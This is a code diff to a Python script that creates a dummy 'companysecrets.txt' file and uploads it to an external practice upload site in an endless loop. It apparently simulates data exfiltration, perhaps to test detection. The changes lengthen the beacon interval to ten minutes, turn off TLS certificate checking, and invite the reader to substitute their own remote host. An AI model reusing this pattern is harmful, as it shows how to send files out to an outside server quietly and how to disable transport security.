@@ -10,18 +10,19 @@ import os
 import time
 from urllib.request import Request, urlopen
 import mimetypes
+from ssl import create_default_context
 
-# Define the directory, file name, and remote URL
-directory = '/'
+# Define the file name and remote URL
 file_name = 'companysecrets.txt'
-remote_url = 'https://practice.expandtesting.com/upload'  # External website that allows uploads
+remote_url = 'https://practice.expandtesting.com/upload'  # Replace with your actual remote IP or URL
 
-def create_file(directory, file_name):
-    full_path = os.path.join(directory, file_name)
+def create_file(file_name):
+    current_directory = os.getcwd()
+    full_path = os.path.join(current_directory, file_name)
     
     try:
-        if not os.path.exists(directory):
-            os.makedirs(directory)
+        if not os.path.exists(current_directory):
+            os.makedirs(current_directory)
         
         with open(full_path, 'w') as file:
             file.write("Q1RGLUhheDByIQ==")
@@ -55,7 +56,12 @@ def post_file(remote_url, full_path):
             headers=headers
         )
         
-        with urlopen(request) as response:
+        # Create a custom SSL context that ignores certificate errors
+        ssl_context = create_default_context()
+        ssl_context.check_hostname = False
+        ssl_context.verify_mode = 0
+        
+        with urlopen(request, context=ssl_context) as response:
             if response.status == 200:
                 print("File posted successfully!")
             else:
@@ -65,15 +71,16 @@ def post_file(remote_url, full_path):
         print(f"An error occurred while posting the file: {e}")
 
 def main():
-    full_path = os.path.join(directory, file_name)
+    current_directory = os.getcwd()
+    full_path = os.path.join(current_directory, file_name)
     
     try:
-        create_file(directory, file_name)
+        create_file(file_name)
         
-        # Loop every 30 seconds
+        # Loop every 10 minutes
         while True:
             post_file(remote_url, full_path)
-            time.sleep(30)  # Sleep for 30 seconds
+            time.sleep(600)  # Sleep for 10 minutes (600 seconds)
 
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
